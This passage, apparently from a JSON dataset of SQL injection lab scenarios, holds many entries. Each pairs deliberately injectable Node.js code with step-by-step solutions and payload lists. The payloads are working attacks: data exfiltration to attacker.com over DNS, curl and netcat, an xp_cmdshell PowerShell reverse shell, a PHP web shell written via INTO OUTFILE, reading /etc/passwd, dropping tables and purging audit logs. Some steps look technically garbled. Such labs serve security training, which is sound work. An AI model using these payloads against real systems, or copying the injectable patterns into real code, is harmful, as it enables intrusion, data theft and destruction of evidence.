    "Lab Description": "A municipal document archive system contains vulnerable LIMIT/OFFSET parameters in its PostgreSQL backend. The application provides no visual feedback but allows stacked queries. To solve: Exfiltrate sensitive tax records through DNS-based out-of-band channel using pg_sleep() conditional delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /docs?page=1",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT tax_id FROM records) TO PROGRAM 'nslookup $(tax_id).attacker.com'--",
      "5. Correlate DNS logs with extracted tax IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'gov_docs',\n  ssl: false\n});\n\napp.get('/docs', async (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  \n  try {\n    const query = `\n      SELECT doc_id, title \n      FROM public_documents \n      LIMIT 10 OFFSET ${offset}`; // Unsafe pagination\n    \n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Internal error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT CASE WHEN 1=1 THEN pg_sleep(10) END--",
      "0; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil(data text); COPY exfil FROM PROGRAM 'curl http://attacker.com/?`ls`'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil%28TEXT%29%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20%27nslookup%20%27||$1||%27.attacker.com%27%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil%28tax_id%29%20FROM%20records--",
      "0' UNION SELECT NULL,(SELECT current_database())--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform UNION SQLi in Friend Search ORDER BY",
    "Lab Description": "A dating application's friend recommendation feature constructs ORDER BY clauses directly from user input. The MySQL backend returns unionized results in JSON responses. To solve: Extract OAuth tokens from the 'sessions' table using column type-matching and hex-encoded payloads while bypassing JSON escaping filters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/friends/search with sort=popularity",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON array types: ' UNION SELECT 1,0x7b226f61757468223a22746f6b656e227d,NULL--",
      "4. Extract session tokens: ' UNION SELECT 1,HEX(token),user_id FROM sessions--",
      "5. Decode hexadecimal values and hijack admin session"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst conn = mysql.createConnection({\n  host: 'localhost',\n  user: 'social_app',\n  password: 'weakpass',\n  database: 'user_profiles'\n});\n\napp.post('/api/friends/search', (req, res) => {\n  const { sort } = req.body;\n  const query = `\n    SELECT user_id, name, popularity \n    FROM users \n    ORDER BY ${sort} \n    LIMIT 50`;\n\n  conn.query(query, (err, results) => {\n    if (err) return res.status(500).json({error: err.code});\n    res.json(results.map(u => ({...u, token: undefined})));\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "(SELECT 1,TO_BASE64(token),3 FROM sessions) UNION--",
      "' UNION SELECT 1,CONVERT(token USING utf8mb4),3 FROM sessions--",
      "1 PROCEDURE ANALYSE((EXTRACTVALUE(1,CONCAT(0x3a,(SELECT token)))),1)--",
      "' AND MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Account Balance HAVING Clause",
    "Lab Description": "A mobile banking web interface contains vulnerable HAVING clause construction in its balance aggregation feature. The Microsoft SQL Server backend returns detailed error messages through verbose logging. To solve: Extract account numbers and balances using error-induced data exfiltration and second-order injection via scheduled transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Trigger error: HAVING 1=convert(int,(SELECT user))--",
      "2. Extract table structure via error messages",
      "3. Craft nested error payload: HAVING 1=CONVERT(INT,(SELECT TOP 1 balance FROM accounts))--",
      "4. Schedule recurring transfer using stacked queries: ; INSERT INTO transfers VALUES ('attacker', @@version)--",
      "5. Retrieve results from scheduled jobs table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_user',\n  password: 'P@ssw0rd1',\n  server: 'localhost',\n  options: { encrypt: false }\n};\n\napp.get('/api/balances', async (req, res) => {\n  try {\n    const pool = await mssql.connect(config);\n    const query = `\n      SELECT user_id, SUM(balance) \n      FROM accounts \n      GROUP BY user_id \n      HAVING ${req.query.filter || '1=1'}`;\n    \n    const result = await pool.request().query(query);\n    res.json(result.recordset);\n  } catch (err) {\n    console.error('Full error:', err.originalError);\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1=CONVERT(int,(SELECT TOP 1 account_number FROM accounts))--",
      "' AND 1=CAST((SELECT balance FROM accounts) AS INT)--",
      "; BEGIN TRANSACTION; INSERT INTO transfers VALUES ('attacker', (SELECT TOP 1 password FROM users)); COMMIT--",
      "HAVING 1 IN (SELECT password FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Blind SQLi in Sensor Group Filter",
    "Lab Description": "An industrial IoT control panel contains vulnerable input handling in sensor grouping parameters. The SQLite backend provides no error feedback but returns HTTP 404 when queries fail. To solve: Map database schema through boolean response analysis and timing attacks using nested CASE statements and WAL journal analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injection point: POST /api/sensors group_ids[]=1",
      "2. Develop boolean inference script using 404 status as false indicator",
      "3. Brute-force table names: group_ids[]=1 AND (SELECT 1 FROM sqlite_master WHERE tbl_name LIKE 'a%')",
      "4. Optimize with binary search on ASCII values",
      "5. Exfiltrate admin credentials using differential response timing"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sensors (id INT, group_id INT, value REAL)\");\n  db.run(\"INSERT INTO sensors VALUES (1, 1, 23.5)\");\n});\n\napp.post('/api/sensors', (req, res) => {\n  const groups = req.body.group_ids || [1];\n  const query = `\n    SELECT * FROM sensors \n    WHERE group_id IN (${groups.join(',')})`;\n\n  db.all(query, (err, rows) => {\n    if (err || rows.length === 0) return res.status(404).end();\n    res.json(rows);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1) AND (SELECT COUNT(*) FROM sqlite_master) > 0--",
      "1 AND (SELECT HEX(substr(sql,1)) FROM sqlite_master LIMIT 1) > '41'--",
      "1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN 1 ELSE 0 END)--",
      "1 AND RANDOMBLOB(1000000000)--"
    ]
  },
  {
    "Lab scenario": "REST API UNION SQLi in User Search Endpoint",
    "Lab Description": "A user management REST API contains vulnerable parameter binding in search queries. The PostgreSQL backend allows UNION operators but requires explicit type casting. To solve: Extract bcrypt password hashes using column type coercion and array_agg() functions while bypassing input length restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable GET /users?search= parameter",
      "2. Determine column count using NULL::text casting",
      "3. Bypass length filter with substring aggregation: UNION SELECT NULL,(SELECT string_agg(substr(password,1,10),'') FROM users)--",
      "4. Reassemble full hashes from partial extracts",
      "5. Crack hashes using john --format=bcrypt"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/users', async (req, res) => {\n  const search = req.query.search || '';\n  const client = new pg.Client();\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT id, username, created_at \n      FROM users \n      WHERE username LIKE '%${search}%' \n      LIMIT 20`;\n    \n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).json({error: err.message});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,password::text,NULL FROM users--",
      "' AND 1=CAST((SELECT COUNT(*) FROM pg_catalog.pg_tables) AS INT)--",
      "'||(SELECT ARRAY_AGG(password) FROM users)::text||'",
      "'; COPY users TO '/var/www/static/passwords.csv'--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in Article Comment Filter",
    "Lab Description": "A WordPress-based CMS contains vulnerable comment filtering that allows stacked time-based injections. The MySQL backend has FILE privileges but blocks UNION operators. To solve: Write web shell to server using INTO OUTFILE and execute commands through User-Agent validation bypass.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable comment_id parameter in moderation panel",
      "2. Verify time delay: 1; SELECT IF(1=1,SLEEP(5),0)--",
      "3. Write PHP shell: 1; SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "4. Bypass file extension filters using .php%00.jpg",
      "5. Execute commands via GET /uploads/shell.php?0=id"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst conn = mysql.createConnection({\n  host: 'localhost',\n  user: 'cms_user',\n  password: 'w0rdpr3ss',\n  database: 'wp_db'\n});\n\napp.post('/moderate-comment', (req, res) => {\n  const commentId = req.body.comment_id;\n  const query = `\n    UPDATE wp_comments \n    SET approved=1 \n    WHERE comment_id=${commentId}`;\n\n  conn.query(query, (err) => {\n    if (err) return res.status(500).send(err.sqlMessage);\n    res.send('Comment approved');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT SLEEP(10)--",
      "1 INTO OUTFILE '/tmp/pwn' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b307d293b203f3e--",
      "1 UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL INTO DUMPFILE '/var/www/html/leak.txt'--",
      "1; GRANT FILE ON *.* TO 'cms_user'@'localhost'--"
    ]
  },
  {
    "Lab scenario": "Inventory System Second-Order SQLi in CSV Export",
    "Lab Description": "A retail inventory system stores unsanitized user input that gets used in later CSV export queries. The Oracle backend allows PL/SQL injection but filters semicolons. To solve: Poison product descriptions with time-based payloads and trigger export job to execute OS commands via DBMS_SCHEDULER.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject product description: '||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
      "2. Schedule hourly export job with poisoned entries",
      "3. Trigger CSV generation through UI",
      "4. Exfiltrate data via DNS: SYS.DBMS_LDAP.INIT((SELECT password FROM users)||'.attacker.com',80)",
      "5. Maintain persistence via DBMS_SCHEDULER job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.urlencoded());\n\napp.post('/products', async (req, res) => {\n  const { name, description } = req.body;\n  const conn = await oracledb.getConnection();\n  \n  try {\n    await conn.execute(\n      `INSERT INTO products (name, desc) \n       VALUES ('${name}', '${description}')`\n    );\n    res.send('Product added');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users))--",
      "'||DBMS_SCHEDULER.CREATE_JOB('EXEC sys.kill_user(''admin'')')--",
      "'||CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version))--",
      "'||DBMS_LDAP.INIT((SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "Travel Booking System Out-of-Band SQLi in Loyalty Points",
    "Lab Description": "An airline loyalty program contains vulnerable points redemption logic with MSSQL xp_cmdshell access. The application blocks direct error output but allows DNS-based exfiltration. To solve: Execute reverse shell via SQL injection chain and pivot to internal payment systems using cracked service account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable POST /redeem parameter: points=100",
      "2. Verify OOB DNS: 100; EXEC master..xp_cmdshell 'nslookup test.attacker.com'--",
      "3. Encode PowerShell reverse shell in hex",
      "4. Execute payload: ; EXEC xp_cmdshell 'powershell -e <encoded>'--",
      "5. Pivot to internal 10.0.0.0/24 network using cracked mssql_svc credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'svc_mssql',\n  password: 'P@ssw0rd123',\n  server: 'localhost',\n  options: {\n    enableArithAbort: true,\n    encrypt: false\n  }\n};\n\napp.post('/redeem', async (req, res) => {\n  const { points } = req.body;\n  const pool = await mssql.connect(config);\n  \n  try {\n    await pool.request().query(\n      `UPDATE loyalty SET points = points - ${points} \n       WHERE user_id = 12345`\n    );\n    res.json({ success: true });\n  } catch (err) {\n    res.status(400).json({ error: 'Redemption failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "100; EXEC xp_cmdshell 'whoami > C:\\inetpub\\wwwroot\\whoami.txt'--",
      "0; DECLARE @s VARCHAR(8000); SET @s=CAST(0x... AS VARCHAR(8000)); EXEC(@s);--",
      "1; DROP TABLE IF EXISTS tmp; CREATE TABLE tmp (data VARCHAR(8000)); BULK INSERT tmp FROM '\\attacker.com\\share\\payload.txt'; EXEC('');--",
      "100; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
    ]
  },
  {
    "Lab scenario": "Internal Admin Panel  SQLi in Role Assignment",
    "Lab Description": "An internal admin panel allows assigning roles to users through a vulnerable SQL query concatenated with user-controlled input. The input is directly passed to the SQL `UPDATE` query without proper sanitization. An attacker with limited access can escalate privileges by injecting into the role assignment input field. This scenario simulates a common misconfiguration where admin interfaces are assumed safe and are poorly validated.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a low-privileged user with access to the role assignment interface",
      "Capture the POST request to `/admin/assign-role`",
      "Modify the `username` parameter to inject: `john'; UPDATE users SET role='admin' WHERE username='attacker`",
      "Observe successful privilege escalation by logging out and back in as `attacker`"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/assign-role', (req, res) => {\n  const username = req.body.username;\n  const role = req.body.role;\n  const sql = `UPDATE users SET role='${role}' WHERE username='${username}'`;\n  db.query(sql, (err) => {\n    if (err) return res.status(500).send('Database error');\n    res.send('Role updated');\n  });\n});",
    "payloads": [
      "john'; UPDATE users SET role='admin' WHERE username='attacker",
      "admin'; DROP TABLE logs;--"
    ]
  },
  {
    "Lab scenario": "Payment History Portal  SQLi in Dynamic Column Filter",
    "Lab Description": "The application backend allows users to search their payment history by various columns like `amount`, `status`, or `method`. The filter column name is user-controlled and directly used in the SQL query, leading to a classic SQLi vulnerability through the `ORDER BY` clause. An attacker can exploit this to inject malicious SQL and dump the full transaction history or manipulate sorting logic.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a GET request to `/payments?sort=amount`",
      "Inject payload: `1; SELECT version();--` in the `sort` parameter",
      "Use UNION-based injection to retrieve transaction secrets or configuration info",
      "Use pg_sleep for time-based confirmation if blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/payments', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount; SELECT pg_sleep(5)--",
      "id; DROP TABLE transactions--"
    ]
  },
  {
    "Lab scenario": "NGO Donor Portal  SQLi via Search Field with LIKE",
    "Lab Description": "The NGO's donation search feature is vulnerable due to unsanitized use of user input in a `LIKE` clause. Attackers can inject SQL using special characters and extract sensitive donor information such as email addresses, donation amount, and messages. This is a common real-world vulnerability due to poor filter design in keyword searches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request: `/search?q=%' OR 1=1--`",
      "Use UNION to select data from `donors` table",
      "Use boolean-based blind SQLi to extract field-by-field info",
      "Automate the exploit using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT * FROM donations WHERE message LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "%' OR 1=1--",
      "%' UNION SELECT null,email,null FROM donors--"
    ]
  },
  {
    "Lab scenario": "GraphQL Backend  SQL Injection in Resolver Function",
    "Lab Description": "A GraphQL resolver directly includes user input from a search query in the SQL statement, making it vulnerable to SQL injection. The injection point is in the GraphQL `searchProducts(term: String)` operation. Exploiting this can lead to arbitrary SQL execution and access to sensitive product inventory details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a GraphQL query with a malicious `term` parameter",
      "Inject: `'; DROP TABLE inventory;--` or UNION injections",
      "Send request via GraphQL playground or API client",
      "Retrieve sensitive data from inventory or logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    searchProducts: async (_, { term }) => {\n      const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n      return await db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "'; DROP TABLE inventory;--",
      "' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "Travel Booking  SQLi in Country Filter with Enumeration",
    "Lab Description": "This application lets users filter travel packages by country. However, the country parameter is unsanitized and directly included in the SQL query. This allows attackers to enumerate packages in other users accounts by bypassing country-level access control using injection in the filter parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GET request to `/packages?country=Italy`",
      "Inject: `Italy' OR 1=1--` to bypass country filter",
      "Use UNION to join with customer table",
      "Dump names and emails using crafted payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/packages', (req, res) => {\n  const country = req.query.country;\n  const sql = `SELECT * FROM travel_packages WHERE country='${country}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Error fetching packages');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "Italy' OR 1=1--",
      "France' UNION SELECT name,email FROM users--"
    ]
  },
  {
    "Lab scenario": "Cloud Service - SQL Injection in API Key Authorization",
    "Lab Description": "A cloud service uses a weak implementation for API key lookup. It concatenates the `x-api-key` header value directly into a query. A malicious actor could modify the header and extract data from other tenants records or even bypass authentication altogether.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Send a GET request with crafted header: `x-api-key: key123' OR 1=1--`",
      "Access unauthorized resources via API response",
      "Test error-based injection to extract schema info",
      "Use time-based injection if output is blind"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/data', (req, res) => {\n  const apiKey = req.headers['x-api-key'];\n  const sql = `SELECT * FROM clients WHERE api_key='${apiKey}'`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(401).send('Invalid key');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "key123' OR 1=1--",
      "key123' UNION SELECT password FROM users--"
    ]
  },
  {
    "Lab scenario": "Employee Portal - SQL Injection in Login Field",
    "Lab Description": "The login form for internal employee authentication takes the username and password and embeds them directly into a SQL query. There is no use of prepared statements or sanitization, making it highly vulnerable. This classic injection can be used to bypass login and access internal records.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter `' OR '1'='1` as username and anything as password",
      "Observe login success without valid credentials",
      "Use UNION to extract employee emails from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const user = req.body.username;\n  const pass = req.body.password;\n  const sql = `SELECT * FROM employees WHERE username='${user}' AND password='${pass}'`;\n  db.query(sql, (err, result) => {\n    if (result.length > 0) res.send('Welcome!');\n    else res.status(401).send('Unauthorized');\n  });\n});",
    "payloads": [
      "' OR '1'='1",
      "' UNION SELECT email FROM employees--"
    ]
  },
  {
    "Lab scenario": "Mobile API - SQL Injection in JSON Body Parameter",
    "Lab Description": "The mobile application sends JSON data containing search filters. The backend fails to validate or sanitize the `title` parameter in the JSON body. An attacker could send a malicious JSON payload to inject arbitrary SQL into the backend and retrieve internal documents.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST request: `{ \"title\": \"' OR 1=1--\" }`",
      "Use injection to list confidential documents",
      "Explore time-based and error-based techniques if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const title = req.body.title;\n  const sql = `SELECT * FROM docs WHERE title='${title}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.status(500).send('Search failed');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' UNION SELECT body FROM docs--"
    ]
  },
  {
    "Lab scenario": "Support Chat System - SQL Injection via Cookie Parameter",
    "Lab Description": "The application identifies users using a session cookie that is directly passed to a SQL query. If an attacker modifies the cookie value to include SQL, it can be used to retrieve or manipulate chat history, impersonate another user, or drop session tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture cookie `session_id=abc123` and modify to `abc123' OR '1'='1`",
      "Inject via Burp Suite or browser extension",
      "Observe chat history from multiple users returned"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/chats', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const sql = `SELECT * FROM messages WHERE session_id='${sessionId}'`;\n  db.query(sql, (err, messages) => {\n    if (err) return res.status(500).send('Chat fetch failed');\n    res.json(messages);\n  });\n});",
    "payloads": [
      "abc123' OR '1'='1",
      "xyz789' UNION SELECT content FROM logs--"
    ]
  },
  {
    "Lab scenario": "E-Commerce API Gateway UNION-Based SQLi in Product Filtering",
    "Lab Description": "A REST API for an online marketplace constructs SQL queries using unsanitized JSON input in WHERE clause parameters. The vulnerable endpoint returns detailed error messages through debug headers and allows UNION operators with explicit type casting. To solve: Extract credit card tokens from the 'payments' table using hex-encoded payloads while bypassing WAF filters that block quote characters and whitespace.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept POST /api/products/search request with Burp Suite using Content-Type: application/json",
      "2. Identify injectable parameter: {\"category\":\"electronics'\"} triggering SQL error",
      "3. Use Postman to send URL-encoded payload: {\"category\":\"'\\u0000'UNION/**/SELECT\\u0020NULL,CONVERT(VARBINARY(MAX),card_token),NULL\\u0020FROM\\u0020payments--\"}",
      "4. Bypass input filters using whitespace alternatives: SELECT%0bNULL,@@version,NULL--",
      "5. Decode hexadecimal results and purge audit logs with stacked query: ; TRUNCATE TABLE access_logs--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json({ limit: '50mb' }));\n\nconst config = {\n  user: 'api_user',\n  password: 'P@ssw0rd123',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const query = `SELECT product_id, name, price FROM products WHERE ${whereClause}`;\n    console.debug('Executing query:', query); // Verbose logging\n    \n    const pool = await mssql.connect(config);\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Time', Date.now()) // Debug header leakage\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000, () => console.log('API Gateway running on port 3000'));",
    "payloads": [
      "' UNION SELECT NULL,card_token,NULL FROM payments--",
      "' AND 1=CONVERT(INT,(SELECT TOP 1 card_token FROM payments))--",
      "'%00' UNION SELECT 1,CAST(card_token AS XML),3 FROM payments FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT card_token FROM payments--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Blind SQLi in Patient Search HAVING Clause",
    "Lab Description": "A HIPAA-compliant patient management system constructs HAVING clauses using unsanitized user input with boolean response patterns. The application provides no direct error feedback but returns different HTTP status codes for true/false conditions. To solve: Extract sensitive medical record IDs using bitwise brute-force techniques and response timing analysis while evading rate limiting controls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /patients?group=1",
      "2. Develop Python script using binary search: (ASCII(SUBSTRING((SELECT TOP 1 record_id FROM records),1)) & 128) = 128",
      "3. Bypass rate limits with rotating User-Agent headers and request throttling",
      "4. Automate extraction with sqlmap: sqlmap -u http://portal/patients?group=1* --technique=B --level=5 --risk=3",
      "5. Correlate extracted record IDs with patient database exports"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/patients', async (req, res) => {\n  const groupId = req.query.group || '1';\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT patient_id, COUNT(*) \n      FROM medical_records \n      GROUP BY patient_id \n      HAVING group_id = ${groupId}`;\n\n    const result = await client.query(query);\n    res.json(result.rows.length > 0 ? 200 : 404);\n  } catch (err) {\n    res.status(500).end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND (SELECT SUBSTRING(record_id,1,1) FROM records OFFSET 0) = 'A'--",
      "1' AND (SELECT LENGTH(record_id) FROM records)=16 AND '1'='1",
      "1) AND EXTRACT(EPOCH FROM pg_sleep(5))::INTEGER = 5--",
      "1; SELECT CASE WHEN (ASCII(SUBSTR(record_id,1)) > 100 THEN pg_sleep(5) END--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Transaction Sorting",
    "Lab Description": "A mobile banking application constructs ORDER BY clauses using unsanitized user input with verbose error logging enabled. The Microsoft SQL Server backend leaks database schema information through type conversion errors. To solve: Extract account numbers and balances using nested error-induced data exfiltration and second-order injection via scheduled transaction comments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error: /transactions?sort=amount'+AND+1=CONVERT(int,(SELECT+user))--",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: sort=1'+AND+1=CONVERT(int,(SELECT+TOP+1+account_number+FROM+accounts))--",
      "4. Schedule transaction with comment payload: '; INSERT INTO transactions VALUES ('attacker', @@version)--",
      "5. Retrieve exfiltrated data from transaction history"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_user',\n  password: 'Secure123!',\n  server: 'localhost',\n  options: { encrypt: true }\n};\n\napp.get('/transactions', async (req, res) => {\n  const sortColumn = req.query.sort || 'date';\n  try {\n    const pool = await mssql.connect(config);\n    const query = `SELECT * FROM transactions ORDER BY ${sortColumn}`;\n    const result = await pool.request().query(query);\n    res.json(result.recordset);\n  } catch (err) {\n    console.error('Full error:', err.originalError.message);\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1 AND 1=CONVERT(int,(SELECT TOP 1 account_number FROM accounts))--",
      "' AND 1=CAST((SELECT balance FROM accounts) AS INT)--",
      "; BEGIN TRANSACTION; INSERT INTO transactions VALUES ('attacker', (SELECT TOP 1 password FROM users)); COMMIT--",
      "ORDER BY (SELECT COUNT(*) FROM information_schema.tables)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Time-Based SQLi in Device Telemetry",
    "Lab Description": "An industrial IoT monitoring system constructs SQL queries using unsanitized device IDs in WHERE clauses. The PostgreSQL backend allows stacked queries with pg_sleep() function access but provides no direct output. To solve: Exfiltrate admin credentials through DNS-based out-of-band channel using conditional time delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter: GET /devices/1/telemetry",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?$(hostname)'--",
      "5. Correlate web server logs with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'iot_metrics',\n  ssl: false\n});\n\napp.get('/devices/:id/telemetry', async (req, res) => {\n  const deviceId = req.params.id;\n  try {\n    const query = `SELECT * FROM telemetry WHERE device_id = ${deviceId}`;\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Device query error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "1; SELECT CASE WHEN (SELECT COUNT(*) FROM users)=3 THEN pg_sleep(10) END--",
      "0; CREATE TEMP TABLE exfil(data text); INSERT INTO exfil SELECT password FROM users; COPY exfil TO PROGRAM 'nc attacker.com 1337'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil(TEXT)%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20'curl%20http://attacker.com/?'||$1%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil(password)%20FROM%20users--",
      "0' UNION SELECT NULL,(SELECT current_database())--"
    ]
  },
  {
    "Lab scenario": "CMS Boolean-Based Blind SQLi in Article Comments",
    "Lab Description": "A content management system constructs SQL queries using unsanitized comment IDs with boolean response patterns. The MySQL backend provides no error messages but returns different HTML templates for true/false conditions. To solve: Extract administrator API keys through bit-shifting brute-force techniques and differential response analysis.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /comments/approve request with Burp Suite",
